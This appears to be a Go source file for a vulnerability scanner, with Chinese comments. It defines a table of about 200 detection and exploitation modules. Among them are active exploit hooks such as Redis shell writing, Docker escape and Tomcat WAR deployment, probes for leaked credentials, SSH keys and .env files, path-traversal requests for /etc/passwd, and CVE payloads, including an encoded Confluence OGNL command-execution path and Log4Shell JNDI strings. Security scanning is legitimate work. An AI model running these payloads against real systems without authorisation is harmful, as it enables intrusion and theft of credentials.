package scanner

import (
	"fmt"
	"io"
	"net"
	"net/http"
	"strings"
	"time"
)

// ExploitModule 漏洞利用/检测模块(数据驱动)
type ExploitModule struct {
	ID       string   // 唯一标识
	Service  string   // 关联服务(用于 auto 匹配)
	Severity string   // critical / high / medium / low
	Desc     string   // 描述
	Path     string   // HTTP 检测路径(空表示非 HTTP 检测)
	Method   string   // GET / POST
	Match    []string // 响应匹配子串(任一命中即判定)
	Type     string   // detect / exploit(自定义模块标记, 内置为空)
	Active   func(ip string, port int, timeout time.Duration) string
}

// vulnModules 内置 200 个漏洞检测/利用模块
var vulnModules = []ExploitModule{
	// ---- 高危服务未授权(主动利用) ----
	{ID: "redis-unauth", Service: "redis", Severity: "critical", Desc: "Redis 未授权访问", Active: exploitRedisUnauth},
	{ID: "redis-write-shell", Service: "redis", Severity: "critical", Desc: "Redis 未授权写 Shell", Active: exploitRedisWriteShell},
	{ID: "mongodb-unauth", Service: "mongodb", Severity: "critical", Desc: "MongoDB 未授权访问", Active: exploitMongoUnauth},
	{ID: "docker-unauth", Service: "docker", Severity: "critical", Desc: "Docker API 未授权", Active: exploitDockerEscape},
	{ID: "elasticsearch-unauth", Service: "elasticsearch", Severity: "critical", Desc: "Elasticsearch 未授权访问", Active: exploitESUnauth},
	{ID: "memcached-unauth", Service: "memcached", Severity: "high", Desc: "Memcached 未授权访问", Active: exploitMemcachedUnauth},
	{ID: "couchdb-unauth", Service: "couchdb", Severity: "high", Desc: "CouchDB 未授权访问", Active: exploitCouchUnauth},
	{ID: "etcd-unauth", Service: "etcd", Severity: "high", Desc: "etcd 未授权访问", Active: exploitEtcdUnauth},
	{ID: "consul-unauth", Service: "consul", Severity: "high", Desc: "Consul 未授权访问", Active: exploitConsulUnauth},
	{ID: "zookeeper-unauth", Service: "zookeeper", Severity: "high", Desc: "ZooKeeper 未授权访问", Active: exploitZKUnauth},
	{ID: "nacos-unauth", Service: "nacos", Severity: "high", Desc: "Nacos 未授权", Active: exploitNacosUnauth},
	{ID: "nacos-register", Service: "nacos", Severity: "high", Desc: "Nacos 未授权注册用户", Active: exploitNacosRegister},
	{ID: "jenkins-unauth", Service: "jenkins", Severity: "critical", Desc: "Jenkins 未授权 RCE 风险", Active: exploitJenkinsScript},
	{ID: "tomcat-manager", Service: "tomcat", Severity: "high", Desc: "Tomcat 管理后台", Active: exploitTomcatWAR},
	{ID: "es-file-read", Service: "elasticsearch", Severity: "high", Desc: "ES 任意文件读取(CVE-2015-5531)", Active: exploitESFileRead},

	// ---- 敏感文件泄露 ----
	{ID: "dotenv", Service: "http", Severity: "high", Desc: "泄露 .env 环境变量", Path: "/.env", Match: []string{"APP_KEY", "DB_PASSWORD", "SECRET", "MAIL_PASSWORD"}},
	{ID: "git-config", Service: "http", Severity: "high", Desc: "泄露 .git/config", Path: "/.git/config", Match: []string{"[core]", "repositoryformatversion"}},
	{ID: "gitignore", Service: "http", Severity: "low", Desc: "泄露 .gitignore", Path: "/.gitignore", Match: []string{".env", "node_modules", "*.log"}},
	{ID: "git-head", Service: "http", Severity: "medium", Desc: "泄露 .git/HEAD", Path: "/.git/HEAD", Match: []string{"ref: refs/heads"}},
	{ID: "svn-entries", Service: "http", Severity: "high", Desc: "泄露 .svn/entries", Path: "/.svn/entries", Match: []string{"has-props", "dir"}},
	{ID: "htaccess", Service: "http", Severity: "low", Desc: "泄露 .htaccess", Path: "/.htaccess", Match: []string{"Rewrite", "Deny from", "AuthType"}},
	{ID: "htpasswd", Service: "http", Severity: "high", Desc: "泄露 .htpasswd", Path: "/.htpasswd", Match: []string{"$apr1$", "{SHA}", "$2y$", "$6$"}},
	{ID: "ds-store", Service: "http", Severity: "low", Desc: "泄露 .DS_Store", Path: "/.DS_Store", Match: []string{"\x00\x00\x00\x01Bud1"}},
	{ID: "backup-zip", Service: "http", Severity: "high", Desc: "源码备份 backup.zip", Path: "/backup.zip", Match: []string{"PK\x03\x04"}},
	{ID: "backup-tar", Service: "http", Severity: "high", Desc: "源码备份 backup.tar.gz", Path: "/backup.tar.gz", Match: []string{"\x1f\x8b"}},
	{ID: "backup-sql", Service: "http", Severity: "high", Desc: "数据库备份 backup.sql", Path: "/backup.sql", Match: []string{"CREATE TABLE", "INSERT INTO"}},
	{ID: "dump-sql", Service: "http", Severity: "high", Desc: "数据库备份 dump.sql", Path: "/dump.sql", Match: []string{"CREATE TABLE"}},
	{ID: "db-sql", Service: "http", Severity: "high", Desc: "数据库备份 db.sql", Path: "/db.sql", Match: []string{"CREATE TABLE"}},
	{ID: "database-sql", Service: "http", Severity: "high", Desc: "数据库备份 database.sql", Path: "/database.sql", Match: []string{"CREATE TABLE"}},
	{ID: "web-config", Service: "http", Severity: "medium", Desc: "泄露 web.config", Path: "/web.config", Match: []string{"<configuration>", "connectionStrings"}},
	{ID: "web-xml", Service: "http", Severity: "medium", Desc: "泄露 WEB-INF/web.xml", Path: "/WEB-INF/web.xml", Match: []string{"<web-app", "servlet"}},
	{ID: "config-php", Service: "http", Severity: "high", Desc: "泄露 config.php", Path: "/config.php", Match: []string{"mysql", "password", "define("}},
	{ID: "config-inc", Service: "http", Severity: "high", Desc: "泄露 config.inc.php", Path: "/config.inc.php", Match: []string{"mysql", "password"}},
	{ID: "wp-config", Service: "http", Severity: "high", Desc: "泄露 wp-config.php", Path: "/wp-config.php", Match: []string{"DB_PASSWORD", "DB_NAME"}},
	{ID: "wp-config-bak", Service: "http", Severity: "high", Desc: "泄露 wp-config.php.bak", Path: "/wp-config.php.bak", Match: []string{"DB_PASSWORD"}},
	{ID: "config-bak", Service: "http", Severity: "medium", Desc: "泄露 config.php.bak", Path: "/config.php.bak", Match: []string{"<?php", "mysql"}},
	{ID: "config-old", Service: "http", Severity: "medium", Desc: "泄露 config.php.old", Path: "/config.php.old", Match: []string{"<?php", "mysql"}},
	{ID: "config-swap", Service: "http", Severity: "medium", Desc: "泄露 config.php~", Path: "/config.php~", Match: []string{"<?php"}},
	{ID: "composer-json", Service: "http", Severity: "low", Desc: "泄露 composer.json", Path: "/composer.json", Match: []string{`"name"`, `"require"`}},
	{ID: "package-json", Service: "http", Severity: "low", Desc: "泄露 package.json", Path: "/package.json", Match: []string{`"name"`, `"version"`, `"dependencies"`}},
	{ID: "npmrc", Service: "http", Severity: "high", Desc: "泄露 .npmrc", Path: "/.npmrc", Match: []string{"registry", "_authToken", "token"}},
	{ID: "dockerfile", Service: "http", Severity: "medium", Desc: "泄露 Dockerfile", Path: "/Dockerfile", Match: []string{"FROM ", "RUN "}},
	{ID: "docker-compose", Service: "http", Severity: "medium", Desc: "泄露 docker-compose.yml", Path: "/docker-compose.yml", Match: []string{"services:", "image:"}},
	{ID: "id-rsa", Service: "http", Severity: "critical", Desc: "泄露 SSH 私钥 id_rsa", Path: "/id_rsa", Match: []string{"PRIVATE KEY"}},
	{ID: "ssh-key", Service: "http", Severity: "critical", Desc: "泄露 .ssh/id_rsa", Path: "/.ssh/id_rsa", Match: []string{"PRIVATE KEY"}},
	{ID: "aws-credentials", Service: "http", Severity: "critical", Desc: "泄露 AWS 凭证", Path: "/.aws/credentials", Match: []string{"aws_access_key_id", "aws_secret_access_key"}},
	{ID: "phpinfo", Service: "http", Severity: "medium", Desc: "phpinfo 信息泄露", Path: "/phpinfo.php", Match: []string{"PHP Version", "System"}},
	{ID: "info-php", Service: "http", Severity: "medium", Desc: "info.php 信息泄露", Path: "/info.php", Match: []string{"PHP Version"}},
	{ID: "test-php", Service: "http", Severity: "low", Desc: "test.php 探测文件", Path: "/test.php", Match: []string{"<?php"}},
	{ID: "robots-txt", Service: "http", Severity: "low", Desc: "robots.txt 泄露路径", Path: "/robots.txt", Match: []string{"Disallow", "User-agent"}},
	{ID: "crossdomain", Service: "http", Severity: "low", Desc: "crossdomain.xml 配置不当", Path: "/crossdomain.xml", Match: []string{"cross-domain-policy", "allow-access-from"}},
	{ID: "editor-config", Service: "http", Severity: "low", Desc: "泄露 .editorconfig", Path: "/.editorconfig", Match: []string{"root = true", "indent"}},
	{ID: "babelrc", Service: "http", Severity: "low", Desc: "泄露 .babelrc", Path: "/.babelrc", Match: []string{`"presets"`}},
	{ID: "eslintrc", Service: "http", Severity: "low", Desc: "泄露 .eslintrc", Path: "/.eslintrc", Match: []string{`"rules"`}},
	{ID: "tsconfig", Service: "http", Severity: "low", Desc: "泄露 tsconfig.json", Path: "/tsconfig.json", Match: []string{`"compilerOptions"`}},
	{ID: "yarn-lock", Service: "http", Severity: "low", Desc: "泄露 yarn.lock", Path: "/yarn.lock", Match: []string{"# yarn lockfile"}},
	{ID: "package-lock", Service: "http", Severity: "low", Desc: "泄露 package-lock.json", Path: "/package-lock.json", Match: []string{`"lockfileVersion"`}},
	{ID: "gemfile", Service: "http", Severity: "low", Desc: "泄露 Gemfile", Path: "/Gemfile", Match: []string{"source ", "gem "}},
	{ID: "pom-xml", Service: "http", Severity: "low", Desc: "泄露 pom.xml", Path: "/pom.xml", Match: []string{"<project", "<dependencies>"}},
	{ID: "build-gradle", Service: "http", Severity: "low", Desc: "泄露 build.gradle", Path: "/build.gradle", Match: []string{"dependencies", "compile"}},

	// ---- 管理后台 ----
	{ID: "phpmyadmin", Service: "http", Severity: "high", Desc: "phpMyAdmin 后台", Path: "/phpmyadmin/", Match: []string{"phpMyAdmin"}},
	{ID: "pma", Service: "http", Severity: "high", Desc: "phpMyAdmin(pma)", Path: "/pma/", Match: []string{"phpMyAdmin"}},
	{ID: "adminer", Service: "http", Severity: "high", Desc: "Adminer 后台", Path: "/adminer.php", Match: []string{"adminer", "Login", "SQL command"}},
	{ID: "admin-page", Service: "http", Severity: "medium", Desc: "后台 /admin", Path: "/admin/", Match: []string{"login", "password", "admin"}},
	{ID: "administrator", Service: "http", Severity: "medium", Desc: "后台 /administrator", Path: "/administrator/", Match: []string{"login", "password"}},
	{ID: "manager-html", Service: "http", Severity: "high", Desc: "Tomcat Manager", Path: "/manager/html", Match: []string{"Tomcat", "manager"}},
	{ID: "host-manager", Service: "http", Severity: "medium", Desc: "Tomcat Host Manager", Path: "/host-manager/html", Match: []string{"Tomcat", "Host Manager"}},
	{ID: "wp-admin", Service: "http", Severity: "low", Desc: "WordPress 后台", Path: "/wp-admin/", Match: []string{"user_login", "wp-submit"}},
	{ID: "wp-login", Service: "http", Severity: "low", Desc: "WordPress 登录", Path: "/wp-login.php", Match: []string{"user_login"}},
	{ID: "jenkins-page", Service: "http", Severity: "high", Desc: "Jenkins 后台", Path: "/jenkins/", Match: []string{"Jenkins", "Dashboard"}},
	{ID: "grafana-page", Service: "http", Severity: "high", Desc: "Grafana 后台", Path: "/grafana/", Match: []string{"Grafana", "login"}},
	{ID: "kibana-page", Service: "http", Severity: "high", Desc: "Kibana 后台", Path: "/kibana/", Match: []string{"Kibana", "elastic"}},
	{ID: "solr-admin", Service: "http", Severity: "high", Desc: "Solr 管理后台", Path: "/solr/admin/", Match: []string{"Solr", "Core Admin"}},
	{ID: "actuator", Service: "http", Severity: "high", Desc: "Spring Actuator", Path: "/actuator", Match: []string{`"_links"`, "actuator"}},
	{ID: "actuator-env", Service: "http", Severity: "high", Desc: "Actuator env 泄露", Path: "/actuator/env", Match: []string{"java.version", "systemEnvironment", "applicationConfig"}},
	{ID: "actuator-heapdump", Service: "http", Severity: "high", Desc: "Actuator heapdump", Path: "/actuator/heapdump", Match: []string{"JAVA PROFILE"}},
	{ID: "actuator-mappings", Service: "http", Severity: "medium", Desc: "Actuator mappings", Path: "/actuator/mappings", Match: []string{"dispatcherServlet"}},
	{ID: "console-page", Service: "http", Severity: "medium", Desc: "后台 /console", Path: "/console/", Match: []string{"login", "password", "console"}},
	{ID: "dashboard", Service: "http", Severity: "medium", Desc: "后台 /dashboard", Path: "/dashboard/", Match: []string{"login", "password"}},
	{ID: "cpanel", Service: "http", Severity: "medium", Desc: "cPanel", Path: "/cpanel/", Match: []string{"cPanel", "Login"}},
	{ID: "webmin", Service: "http", Severity: "medium", Desc: "Webmin", Path: "/webmin/", Match: []string{"Webmin", "login"}},
	{ID: "zabbix-page", Service: "http", Severity: "medium", Desc: "Zabbix", Path: "/zabbix/", Match: []string{"Zabbix", "login"}},
	{ID: "nagios-page", Service: "http", Severity: "medium", Desc: "Nagios", Path: "/nagios/", Match: []string{"Nagios", "login"}},

	// ---- CVE 签名 ----
	{ID: "cve-2021-44228-log4j", Service: "http", Severity: "critical", Desc: "Log4Shell 探测", Path: "/${jndi:ldap://x}", Match: []string{"jndi", "ldap"}},
	{ID: "cve-2022-22965-spring4shell", Service: "http", Severity: "critical", Desc: "Spring4Shell 探测", Path: "/", Method: "POST", Match: []string{"class.module.classLoader"}},
	{ID: "cve-2017-5638-struts2", Service: "http", Severity: "critical", Desc: "Struts2 RCE(S2-045)", Path: "/", Match: []string{"struts", "Content-Type"}},
	{ID: "cve-2021-41773-apache", Service: "http", Severity: "critical", Desc: "Apache 路径穿越 RCE", Path: "/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh", Match: []string{"bin/sh", "root:"}},
	{ID: "cve-2021-26084-confluence", Service: "http", Severity: "critical", Desc: "Confluence OGNL RCE", Path: "/pages/createpage-entervariables.action", Match: []string{"Confluence", "createpage"}},
	{ID: "cve-2019-19781-citrix", Service: "http", Severity: "critical", Desc: "Citrix 路径穿越", Path: "/vpn/../vpns/portal/scripts/newbm.pl", Match: []string{"Citrix", "NetScaler"}},
	{ID: "cve-2020-14882-weblogic", Service: "http", Severity: "critical", Desc: "Weblogic 控制台", Path: "/console/login/LoginForm.jsp", Match: []string{"WebLogic", "login"}},
	{ID: "cve-2019-2725-weblogic", Service: "http", Severity: "critical", Desc: "Weblogic 反序列化", Path: "/_async/AsyncResponseService", Match: []string{"weblogic"}},
	{ID: "cve-2021-34473-exchange", Service: "http", Severity: "critical", Desc: "Exchange ProxyShell", Path: "/autodiscover/autodiscover.json", Match: []string{"@Exchange", "autodiscover"}},
	{ID: "cve-2018-13379-fortinet", Service: "http", Severity: "high", Desc: "FortiOS 路径泄露", Path: "/remote/fgt_lang?lang=/../../../..//////////etc/passwd", Match: []string{"root:"}},
	{ID: "cve-2020-5902-f5", Service: "http", Severity: "critical", Desc: "F5 BIG-IP RCE", Path: "/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp", Match: []string{"tmshCmd", "F5"}},
	{ID: "cve-2021-21972-vcenter", Service: "http", Severity: "critical", Desc: "vCenter RCE", Path: "/ui/vropspluginui/rest/services/uploadova", Match: []string{"vCenter", "uploadova"}},
	{ID: "cve-2019-11510-pulse", Service: "http", Severity: "critical", Desc: "Pulse Secure 任意文件读取", Path: "/dana-na/../dana/html5acc/guacamole/../../../../etc/passwd", Match: []string{"root:"}},
	{ID: "cve-2021-22205-gitlab", Service: "http", Severity: "critical", Desc: "GitLab RCE", Path: "/users/sign_in", Match: []string{"GitLab", "gon.gitlab"}},
	{ID: "cve-2020-1938-ajp", Service: "http", Severity: "critical", Desc: "Tomcat AJP 文件读取", Path: "/", Match: []string{"tomcat"}},
	{ID: "cve-2022-26134-confluence", Service: "http", Severity: "critical", Desc: "Confluence OGNL RCE", Path: "/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/", Match: []string{"uid="}},
	{ID: "cve-2021-41773-cgi", Service: "http", Severity: "critical", Desc: "Apache 2.4.49 RCE", Path: "/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd", Match: []string{"root:"}},
	{ID: "cve-2022-22947-gateway", Service: "http", Severity: "critical", Desc: "Spring Cloud Gateway RCE", Path: "/actuator/gateway/routes", Match: []string{"routes", "uri"}},
	{ID: "cve-2023-22515-confluence", Service: "http", Severity: "high", Desc: "Confluence 权限提升", Path: "/setup/setupadministrator.action", Match: []string{"setupadministrator", "Confluence"}},
	{ID: "cve-2021-35464-log4j2", Service: "http", Severity: "critical", Desc: "Log4j 反序列化", Path: "/", Match: []string{"log4j", "Log4j"}},

	// ---- 框架/中间件暴露 ----
	{ID: "swagger-ui", Service: "http", Severity: "medium", Desc: "Swagger UI", Path: "/swagger-ui.html", Match: []string{"swagger-ui", "Swagger"}},
	{ID: "swagger-json", Service: "http", Severity: "medium", Desc: "Swagger JSON", Path: "/swagger.json", Match: []string{`"paths"`, "swagger"}},
	{ID: "api-docs", Service: "http", Severity: "medium", Desc: "Spring API docs", Path: "/v2/api-docs", Match: []string{`"paths"`, "swagger"}},
	{ID: "v3-api-docs", Service: "http", Severity: "medium", Desc: "Spring API docs v3", Path: "/v3/api-docs", Match: []string{`"openapi"`, `"paths"`}},
	{ID: "server-status", Service: "http", Severity: "medium", Desc: "Apache server-status", Path: "/server-status", Match: []string{"Server Version", "Apache Server Status"}},
	{ID: "server-info", Service: "http", Severity: "medium", Desc: "Apache server-info", Path: "/server-info", Match: []string{"Server Information", "Apache"}},
	{ID: "trace-axd", Service: "http", Severity: "medium", Desc: "ASP.NET Trace.axd", Path: "/Trace.axd", Match: []string{"Trace", "ASP.NET"}},
	{ID: "elmah", Service: "http", Severity: "medium", Desc: "ELMAH 错误日志", Path: "/elmah.axd", Match: []string{"Error Log", "ELMAH"}},
	{ID: "axis2", Service: "http", Severity: "high", Desc: "Axis2 服务列表", Path: "/axis2/services/listServices", Match: []string{"Available services", "Axis2"}},
	{ID: "jmx-console", Service: "http", Severity: "high", Desc: "JBoss JMX Console", Path: "/jmx-console/", Match: []string{"JMX Agent View", "jboss"}},
	{ID: "web-console", Service: "http", Severity: "high", Desc: "JBoss Web Console", Path: "/web-console/", Match: []string{"JBoss", "Management Console"}},
	{ID: "invoker", Service: "http", Severity: "high", Desc: "JBoss Invoker", Path: "/invoker/JMXInvokerServlet", Match: []string{"jboss"}},
	{ID: "druid", Service: "http", Severity: "medium", Desc: "Druid 监控", Path: "/druid/index.html", Match: []string{"Druid", "DataSource"}},
	{ID: "graphiql", Service: "http", Severity: "low", Desc: "GraphQL 接口", Path: "/graphiql", Match: []string{"GraphiQL", "graphql"}},
	{ID: "graphql-endpoint", Service: "http", Severity: "low", Desc: "GraphQL 端点", Path: "/graphql", Match: []string{"query", "schema"}},
	{ID: "actuator-beans", Service: "http", Severity: "medium", Desc: "Actuator beans", Path: "/actuator/beans", Match: []string{"beans", "bean"}},
	{ID: "actuator-configprops", Service: "http", Severity: "high", Desc: "Actuator configprops", Path: "/actuator/configprops", Match: []string{"properties", "config"}},
	{ID: "actuator-metrics", Service: "http", Severity: "medium", Desc: "Actuator metrics", Path: "/actuator/metrics", Match: []string{`"names"`, "jvm."}},
	{ID: "healthz", Service: "http", Severity: "low", Desc: "健康检查 healthz", Path: "/healthz", Match: []string{"ok", "healthy"}},
	{ID: "metrics", Service: "http", Severity: "low", Desc: "Prometheus metrics", Path: "/metrics", Match: []string{"process_", "http_requests", "go_"}},
	{ID: "es-indices", Service: "http", Severity: "high", Desc: "ES 索引列表", Path: "/_cat/indices", Match: []string{"health", "index"}},
	{ID: "es-nodes", Service: "http", Severity: "medium", Desc: "ES 节点信息", Path: "/_nodes", Match: []string{`"nodes"`, "cluster_name"}},
	{ID: "k8s-version", Service: "http", Severity: "medium", Desc: "K8s API", Path: "/version", Match: []string{"gitVersion", "kubelet"}},
	{ID: "docker-version", Service: "http", Severity: "high", Desc: "Docker API version", Path: "/version", Match: []string{"ApiVersion", "Version"}},
	{ID: "etcd-version", Service: "http", Severity: "medium", Desc: "etcd version", Path: "/version", Match: []string{"etcdserver", "etcdcluster"}},
	{ID: "consul-self", Service: "http", Severity: "medium", Desc: "Consul agent", Path: "/v1/agent/self", Match: []string{"Config", "Member"}},
	{ID: "nacos-users", Service: "http", Severity: "high", Desc: "Nacos 用户列表", Path: "/nacos/v1/auth/users", Match: []string{"totalCount", "username"}},
	{ID: "struts2-showcase", Service: "http", Severity: "medium", Desc: "Struts2 showcase", Path: "/struts2-showcase/", Match: []string{"Struts", "showcase"}},
	{ID: "struts2-blank", Service: "http", Severity: "medium", Desc: "Struts2 blank", Path: "/struts2-blank/", Match: []string{"Struts"}},
	{ID: "weblogic-console", Service: "http", Severity: "medium", Desc: "Weblogic 控制台", Path: "/console/", Match: []string{"WebLogic", "console"}},
	{ID: "jboss-console", Service: "http", Severity: "medium", Desc: "JBoss 控制台", Path: "/console/App.html", Match: []string{"JBoss"}},
	{ID: "druid-sql", Service: "http", Severity: "high", Desc: "Druid SQL 监控", Path: "/druid/sql.json", Match: []string{"SQL", "DataSource"}},

	// ---- 路径穿越/文件读取 ----
	{ID: "traversal-linux", Service: "http", Severity: "critical", Desc: "Linux 路径穿越", Path: "/../../../../../../etc/passwd", Match: []string{"root:"}},
	{ID: "traversal-windows", Service: "http", Severity: "critical", Desc: "Windows 路径穿越", Path: "/../../../../../../windows/win.ini", Match: []string{"[extensions]", "[fonts]"}},
	{ID: "traversal-dot", Service: "http", Severity: "critical", Desc: "路径穿越(..%2f)", Path: "/..%2f..%2f..%2f..%2f..%2fetc/passwd", Match: []string{"root:"}},
	{ID: "traversal-double", Service: "http", Severity: "critical", Desc: "路径穿越(双编码)", Path: "/%252e%252e%252fetc/passwd", Match: []string{"root:"}},
	{ID: "lfi-php", Service: "http", Severity: "critical", Desc: "PHP LFI", Path: "/index.php?page=../../../../etc/passwd", Match: []string{"root:"}},
	{ID: "lfi-window", Service: "http", Severity: "high", Desc: "LFI windows", Path: "/index.php?file=../../../../windows/win.ini", Match: []string{"[extensions]"}},

	// ---- 默认凭证/配置 ----
	{ID: "tomcat-default", Service: "http", Severity: "high", Desc: "Tomcat 默认页面", Path: "/", Match: []string{"Apache Tomcat", "If you're seeing this"}},
	{ID: "nginx-default", Service: "http", Severity: "low", Desc: "Nginx 默认页面", Path: "/", Match: []string{"Welcome to nginx"}},
	{ID: "iis-default", Service: "http", Severity: "low", Desc: "IIS 默认页面", Path: "/", Match: []string{"IIS Windows Server"}},
	{ID: "apache-default", Service: "http", Severity: "low", Desc: "Apache 默认页面", Path: "/", Match: []string{"It works", "Apache2"}},
	{ID: "welcome-to", Service: "http", Severity: "low", Desc: "Web 服务器默认页", Path: "/", Match: []string{"Welcome to", "successfully installed"}},
	{ID: "debug-mode", Service: "http", Severity: "medium", Desc: "Debug 模式", Path: "/debug", Match: []string{"debug", "stack trace", "traceback"}},
	{ID: "error-log", Service: "http", Severity: "medium", Desc: "错误日志泄露", Path: "/error_log", Match: []string{"PHP", "Error", "Notice"}},
	{ID: "log-file", Service: "http", Severity: "medium", Desc: "日志文件泄露", Path: "/logs/", Match: []string{"Index of", "log"}},
	{ID: "directory-listing", Service: "http", Severity: "low", Desc: "目录列表", Path: "/", Match: []string{"Index of /", "Directory Listing"}},
	{ID: "listing-backup", Service: "http", Severity: "medium", Desc: "备份目录列表", Path: "/backup/", Match: []string{"Index of", "backup"}},
	{ID: "listing-upload", Service: "http", Severity: "medium", Desc: "上传目录列表", Path: "/uploads/", Match: []string{"Index of", "upload"}},

	// ---- 其它常见漏洞 ----
	{ID: "ssrf-meta", Service: "http", Severity: "medium", Desc: "SSRF 探测点", Path: "/?url=http://127.0.0.1", Match: []string{"127.0.0.1", "localhost", "internal"}},
	{ID: "sql-injection", Service: "http", Severity: "high", Desc: "SQL 注入探测", Path: "/?id=1'", Match: []string{"SQL syntax", "mysql", "sqlite", "ORA-", "syntax error"}},
	{ID: "xss-reflect", Service: "http", Severity: "medium", Desc: "反射型 XSS", Path: "/?q=<script>alert(1)</script>", Match: []string{"<script>alert(1)"}},
	{ID: "open-redirect", Service: "http", Severity: "low", Desc: "开放重定向", Path: "/?redirect=https://evil.com", Match: []string{"evil.com"}},
	{ID: "cors-misconfig", Service: "http", Severity: "low", Desc: "CORS 配置", Path: "/", Match: []string{"Access-Control-Allow-Origin"}},
	{ID: "php-disable", Service: "http", Severity: "low", Desc: "PHP 环境", Path: "/", Match: []string{"X-Powered-By: PHP"}},
	{ID: "server-header", Service: "http", Severity: "low", Desc: "Server 头泄露", Path: "/", Match: []string{"Server: "}},
	{ID: "wordpress-readme", Service: "http", Severity: "low", Desc: "WordPress readme", Path: "/readme.html", Match: []string{"WordPress", "Installation"}},
	{ID: "wp-xmlrpc", Service: "http", Severity: "medium", Desc: "WordPress xmlrpc", Path: "/xmlrpc.php", Match: []string{"XML-RPC", "pingback"}},
	{ID: "wp-json-users", Service: "http", Severity: "medium", Desc: "WP 用户枚举", Path: "/wp-json/wp/v2/users", Match: []string{`"slug"`, `"name"`}},
	{ID: "phpmyadmin-setup", Service: "http", Severity: "high", Desc: "phpMyAdmin setup", Path: "/phpmyadmin/setup/", Match: []string{"phpMyAdmin", "setup"}},
	{ID: "joomla-install", Service: "http", Severity: "medium", Desc: "Joomla 安装目录", Path: "/installation/", Match: []string{"Joomla", "Installation"}},
	{ID: "drupal-install", Service: "http", Severity: "medium", Desc: "Drupal 安装", Path: "/install.php", Match: []string{"Drupal", "Installation"}},
	{ID: "magento-install", Service: "http", Severity: "medium", Desc: "Magento 安装", Path: "/setup/", Match: []string{"Magento", "Installation"}},
	{ID: "phpunit", Service: "http", Severity: "high", Desc: "PHPUnit RCE", Path: "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", Match: []string{"PHPUnit"}},
	{ID: "laravel-debug", Service: "http", Severity: "high", Desc: "Laravel Debug 模式", Path: "/_ignition/health-check", Match: []string{"ok", "Ignition"}},
	{ID: "thinkphp-rce", Service: "http", Severity: "critical", Desc: "ThinkPHP RCE", Path: "/index.php?s=/Index/\\think\\app/invokefunction&function=phpinfo", Match: []string{"PHP Version"}},
	{ID: "fastjson", Service: "http", Severity: "critical", Desc: "Fastjson RCE", Path: "/", Method: "POST", Match: []string{"fastjson"}},
	{ID: "shiro-default", Service: "http", Severity: "high", Desc: "Shiro 默认密钥", Path: "/", Match: []string{"rememberMe"}},
	{ID: "springboot-env", Service: "http", Severity: "high", Desc: "Spring Boot 环境", Path: "/env", Match: []string{"spring.datasource", "java."}},
	{ID: "springboot-config", Service: "http", Severity: "medium", Desc: "Spring Boot 配置", Path: "/configprops", Match: []string{"properties"}},
	{ID: "springboot-trace", Service: "http", Severity: "medium", Desc: "Spring Boot trace", Path: "/trace", Match: []string{"timestamp", "request"}},
	{ID: "springboot-dump", Service: "http", Severity: "high", Desc: "Spring Boot heapdump", Path: "/heapdump", Match: []string{"JAVA PROFILE"}},
	{ID: "springboot-autoconfig", Service: "http", Severity: "medium", Desc: "Spring Boot autoconfig", Path: "/autoconfig", Match: []string{"conditions", "beans"}},
	{ID: "gitea", Service: "http", Severity: "medium", Desc: "Gitea 服务", Path: "/", Match: []string{"Gitea", "git"}},
	{ID: "gitlab", Service: "http", Severity: "medium", Desc: "GitLab 服务", Path: "/", Match: []string{"GitLab"}},
	{ID: "sonarqube", Service: "http", Severity: "high", Desc: "SonarQube", Path: "/", Match: []string{"SonarQube", "sonar"}},
	{ID: "kibana-status", Service: "http", Severity: "medium", Desc: "Kibana 状态", Path: "/status", Match: []string{"kibana", "status"}},
	{ID: "es-search", Service: "http", Severity: "high", Desc: "ES 搜索接口", Path: "/_search", Match: []string{"hits", "took"}},
	{ID: "es-settings", Service: "http", Severity: "high", Desc: "ES 设置", Path: "/_settings", Match: []string{"settings", "index"}},
	{ID: "couchdb-all", Service: "http", Severity: "high", Desc: "CouchDB 数据库", Path: "/_all_dbs", Match: []string{"_replicator", "_users"}},
	{ID: "couchdb-config", Service: "http", Severity: "high", Desc: "CouchDB 配置", Path: "/_config", Match: []string{"config", "couchdb"}},
	{ID: "k8s-pods", Service: "http", Severity: "high", Desc: "K8s pods", Path: "/api/v1/pods", Match: []string{`"items"`, "metadata"}},
	{ID: "etcd-keys", Service: "http", Severity: "high", Desc: "etcd keys", Path: "/v2/keys", Match: []string{"node", "key"}},
	{ID: "consul-kv", Service: "http", Severity: "high", Desc: "Consul KV", Path: "/v1/kv", Match: []string{"LockIndex", "CreateIndex"}},
	{ID: "zookeeper-commands", Service: "http", Severity: "medium", Desc: "ZooKeeper 命令", Path: "/commands", Match: []string{"commands", "leader"}},
	{ID: "cve-2016-10033-phpmailer", Service: "http", Severity: "critical", Desc: "PHPMailer RCE(CVE-2016-10033)", Path: "/", Match: []string{"phpmailer", "sendmail"}},
	{ID: "cve-2019-11043-phpfpm", Service: "http", Severity: "critical", Desc: "PHP-FPM RCE(CVE-2019-11043)", Path: "/index.php", Match: []string{"php", "fpm"}},
	{ID: "cve-2020-0688-exchange", Service: "http", Severity: "critical", Desc: "Exchange 反序列化 RCE", Path: "/ecp/", Match: []string{"Exchange", "ecp"}},
	{ID: "cve-2022-22954-vmware", Service: "http", Severity: "critical", Desc: "VMware Workspace ONE RCE", Path: "/catalog-portal/ui/oauth/verify", Match: []string{"freemarker", "error"}},
	{ID: "cve-2021-22986-f5", Service: "http", Severity: "critical", Desc: "F5 BIG-IP iControl RCE", Path: "/mgmt/tm/util/bash", Match: []string{"command", "util"}},
	{ID: "cve-2018-7600-drupal", Service: "http", Severity: "critical", Desc: "Drupalgeddon2 RCE", Path: "/user/register", Match: []string{"drupal", "register"}},
	{ID: "cve-2020-3452-cisco", Service: "http", Severity: "high", Desc: "Cisco ASA 任意文件读取", Path: "/+CSCOT+/translation-table?type=mst", Match: []string{"Cisco", "translation"}},
	{ID: "cve-2021-26855-exchange", Service: "http", Severity: "critical", Desc: "Exchange ProxyLogon", Path: "/ecp/xx.js", Match: []string{"Exchange"}},
